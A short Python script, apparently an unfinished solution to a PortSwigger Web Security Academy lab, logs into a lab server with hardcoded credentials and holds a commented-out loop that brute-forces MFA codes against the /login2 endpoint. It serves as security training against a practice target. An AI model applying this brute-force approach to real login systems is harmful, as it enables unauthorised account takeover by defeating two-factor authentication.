from http import HTTPStatus
from pathlib import Path

import typer
import requests
from lxml import html
from rich.console import Console
from rich.progress import track
from rich.progress import Progress


console = Console()
app = typer.Typer()

@app.command()
def run(codes_file: Path, server: str = typer.Option(default=...)):
    with open(codes_file) as f:
        codes = [line.strip() for line in f.readlines()]
  
    PASSWORD="montoya"
    VALID_USERNAME='carlos'
    SERVER = f"https://{server}.web-security-academy.net"


    correct_username_response_time=0.
   

    console.log("Brute-forcing codes...")
    counter=0
    perform_login(VALID_USERNAME,PASSWORD, SERVER)
    """
    for code in track(codes, description="Brute-forcing codes for carlos...", console=console):
        console.log(f"Currently checked: {code}")
        response = requests.post(
            f"{SERVER}/login2",
            data={
                "mfa-code": code,
            },
           
        )

        console.log(response.cookies)
    """
    
      

def perform_login(VALID_USERNAME,PASSWORD, SERVER):
    response = requests.post(
            f"{SERVER}/login",
            data={
                "username": VALID_USERNAME,
                "password": PASSWORD,
            },
    )
    console.log(f'Login status: {response.text}')
    console.log(response.cookies)






if __name__ == "__main__":
    app()